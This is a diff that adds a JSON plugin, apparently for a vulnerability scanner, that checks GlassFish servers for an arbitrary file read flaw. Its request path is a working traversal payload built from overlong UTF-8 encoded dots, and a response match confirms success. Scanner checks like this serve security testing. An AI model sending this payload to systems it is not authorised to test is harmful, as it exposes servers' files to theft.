@@ -1,0 +1,23 @@
+{
+    "target":"glassfish",
+    "meta":{
+        "name":    "GlassFish 任意文件读取",
+        "remarks": "可读取服务器上的任意文件。",
+        "level":   2,
+        "type":    "LFR",
+        "author":   "wolf",
+        "references": {
+            "url":"https://github.com/vulhub/vulhub/tree/master/glassfish/4.1.0",
+            "cve":"",
+            "kpid":"KP-0059"
+        }
+    },
+    "request":{
+        "path":     "/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/",
+        "postData": ""
+    },
+    "verify":{
+        "type":  "string",
+        "match": "package-appclient.xml"
+    }
+}
